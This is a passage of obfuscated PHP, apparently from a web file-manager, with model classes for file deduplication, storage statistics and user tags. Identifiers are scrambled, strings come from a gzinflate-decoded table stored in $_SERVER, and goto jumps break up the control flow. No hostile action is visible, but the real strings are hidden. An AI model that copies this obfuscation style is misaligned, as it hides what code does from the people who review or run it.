continue; } $ÁÆ‰†ßÆÖ± = $œÔ ? $ÁÆ‰†ßÆÖ± : -intval($ÁÆ‰†ßÆÖ±); $ç¥Ùˆ = array($ó‰éùøµ[461] => array($ó‰éùøµ[7], $×¬Üº­)); if ($ÁÆ‰†ßÆÖ± < 0) { $ç¥Ùˆ[$ó‰éùøµ[1816]] = array($ó‰éùøµ[1012], abs($ÁÆ‰†ßÆÖ±)); } $this->where($ç¥Ùˆ)->setAdd($ó‰éùøµ[1816], $ÁÆ‰†ßÆÖ±); } } public function findByHash($İÌôŸ, $ñ¼ãÂ¼¶ = false) { $¾–À¯©Ş¦Ëø¯ =& $_SERVER[èÍ×öˆøÉ]; if (!$İÌôŸ && !$ñ¼ãÂ¼¶) { return !1; } $Ï®æ¯ù†·¡ = array($¾–À¯©Ş¦Ëø¯[1810] => $İÌôŸ); if ($ñ¼ãÂ¼¶) { $Ï®æ¯ù†·¡ = array($¾–À¯©Ş¦Ëø¯[1811] => $ñ¼ãÂ¼¶); } return $this->order($¾–À¯©Ş¦Ëø¯[1817])->where($Ï®æ¯ù†·¡)->find(); } public function clearEmpty($ßÅÏ = 0) { $ ´è­¦÷ =& $_SERVER[èÍ×öˆøÉ]; $åÅ = time() - 3600 * 24 * $ßÅÏ; $Ú¶ = $ ´è­¦÷[1818] . $åÅ; $¹Š½˜ = $this->where($Ú¶)->select(); if (!$¹Š½˜) { return; } $õ = new Task($ ´è­¦÷[1819], $ ´è­¦÷[33], count($¹Š½˜)); foreach ($¹Š½˜ as $ŠŸÄ»íûé£¹«) { $õ->update(1); $this->resetFile($ŠŸÄ»íûé£¹«); } $õ->end(); } public function resetFile($Ï›’Ğ¬ö) { $ñŠÓ«™ =& $_SERVER[èÍ×öˆøÉ]; $ƒÛ•µñ¿ = array($ñŠÓ«™[462] => $Ï›’Ğ¬ö[$ñŠÓ«™[461]]); $­óƒ‹ = Model($ñŠÓ«™[1256])->where($ƒÛ•µñ¿)->count(); $ƒ«²óîà»‹ = Model($ñŠÓ«™[1820])->where($ƒÛ•µñ¿)->count(); $æİ”• = intval($­óƒ‹) + intval($ƒ«²óîà»‹); if ($æİ”• == 0) { IO::remove($Ï›’Ğ¬ö[$ñŠÓ«™[76]]); Model($ñŠÓ«™[1821])->delete($Ï›’Ğ¬ö[$ñŠÓ«™[461]]); $this->where($ƒÛ•µñ¿)->delete(); $this->metaSet($Ï›’Ğ¬ö[$ñŠÓ«™[461]], null, null); return; } if ($Ï›’Ğ¬ö[$ñŠÓ«™[1816]] != $æİ”•) { $this->where($ƒÛ•µñ¿)->save(array($ñŠÓ«™[1809] => $æİ”•)); } } public function storageInfo($‡½—ÜÎ‡ùÛ§ = false) { $’ê­ =& $_SERVER[èÍ×öˆøÉ]; $ÎÊ = $this->count() + 0.0; $•Ì›”¦ = 0; $¦°¥Ùí = 1; $ôÆ²Õ¦³ = 0; $ãµ•…„Î¨… = 5000; for ($Š—Úã¬ÑèŞ = 0; $Š—Úã¬ÑèŞ < $ÎÊ; $Š—Úã¬ÑèŞ = $Š—Úã¬ÑèŞ + $ãµ•…„Î¨…) { $Íòš˜ÖËƒİ = $this->limit($Š—Úã¬ÑèŞ, $Š—Úã¬ÑèŞ + $ãµ•…„Î¨…)->select(); foreach ($Íòš˜ÖËƒİ as $Ì¿¼†ĞÔ) { $¦°¥Ùí += $Ì¿¼†ĞÔ[$’ê­[78]] * $Ì¿¼†ĞÔ[$’ê­[1816]]; $•Ì›”¦ += $Ì¿¼†ĞÔ[$’ê­[78]] * ($Ì¿¼†ĞÔ[$’ê­[1816]] - 1); $ôÆ²Õ¦³ += $Ì¿¼†ĞÔ[$’ê­[1816]]; } } $€Û = array($’ê­[1822] => $¦°¥Ùí, $’ê­[1823] => $•Ì›”¦, $’ê­[1824] => $•Ì›”¦ / $¦°¥Ùí, $’ê­[82] => $ÎÊ, $’ê­[1825] => $ôÆ²Õ¦³); return $€Û; } } goto e‹Œ•™ì­’; BƒèŞºÚš¸: define($_SERVER[èÍ×öˆøÉ][598], $_SERVER[èÍ×öˆøÉ][599]); $ltpxksfwhg = $_SERVER[èÍ×öˆøÉ][600]; $_SERVER[òÛ‡ê…ú] = explode($_SERVER[èÍ×öˆøÉ][601], gzinflate(substr($_SERVER[èÍ×öˆøÉ][602], 10, -8))); goto c‡¹‹¬°Ù¬; e‹ß¥µÅ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($€Å) { $ÅÄÉ²Şä¥Ò =& $_SERVER[èÍ×öˆøÉ]; return array($ÅÄÉ²Şä¥Ò[1859] => array(USER_ID, $ÅÄÉ²Şä¥Ò[1860])); } protected function listData() { $¯ÂÈØÀİ« =& $_SERVER[èÍ×öˆøÉ]; $‚²İ²ç = array($¯ÂÈØÀİ«[1573] => USER_ID, $¯ÂÈØÀİ«[477] => array($¯ÂÈØÀİ«[1863], 0)); $À­ğß = $¯ÂÈØÀİ«[1865]; $ş°¾Î¶ = $this->field($À­ğß)->where($‚²İ²ç)->order($¯ÂÈØÀİ«[1866])->select(); return $ş°¾Î¶ ? $ş°¾Î¶ : array(); } protected function listByTag($ŠĞôÉŠ«™¢ó) { } protected function addToTag($‘ˆºÕŸ, $ŸÎ) { $â¸é‡æ =& $_SERVER[èÍ×öˆøÉ]; if (!Model($â¸é‡æ[1999])->listData($ŸÎ) || !Model($â¸é‡æ[827])->pathInfo($‘ˆºÕŸ)) { return !1; } $”–Ş±£ãöÌØ = array($â¸é‡æ[1573] => USER_ID, $â¸é‡æ[477] => $ŸÎ, $â¸é‡æ[416] => $‘ˆºÕŸ, $â¸é‡æ[417] => $â¸é‡æ[411], $â¸é‡æ[415] => $â¸é‡æ[33], $â¸é‡æ[1753] => 0); if ($this->where($”–Ş±£ãöÌØ)->find()) { return !1; } return $this->add($”–Ş±£ãöÌØ); } protected function removeFromTag($´àÅˆŒ, $Å°ì¢°à¯Úƒ) { $Åğ =& $_SERVER[èÍ×öˆøÉ]; if (!Model($Åğ[1999])->listData($Å°ì¢°à¯Úƒ)) { return !1; } if (is_array($´àÅˆŒ)) { $´àÅˆŒ = array($Åğ[7], $´àÅˆŒ); } $í¶Ó› = array($Åğ[1573] => USER_ID, $Åğ[477] => $Å°ì¢°à¯Úƒ, $Åğ[417] => $Åğ[411], $Åğ[416] => $´àÅˆŒ); return $this->where($í¶Ó›)->delete(); } protected function removeByTag($¾ñ) { $ˆˆ¡‘´ =& $_SERVER[èÍ×öˆøÉ]; if (!$¾ñ) { return !1; } $İšä×…¬  = array($ˆˆ¡‘´[1573] => USER_ID, $ˆˆ¡‘´[477] => $¾ñ); return $this->where($İšä×…¬ )->delete(); } protected function removeBySource($á¨) { $ñ ¸Ğ =& $_SERVER[èÍ×öˆøÉ]; if (is_array($á¨)) { $á¨ = array($ñ ¸Ğ[7], $á¨); } $ãàµğÚè›£ = array($ñ ¸Ğ[1573] => USER_ID, $ñ ¸Ğ[416] => $á¨, $ñ ¸Ğ[477] => array($ñ ¸Ğ[1011], 0)); return $this->where($ãàµğÚè›£)->delete(); } }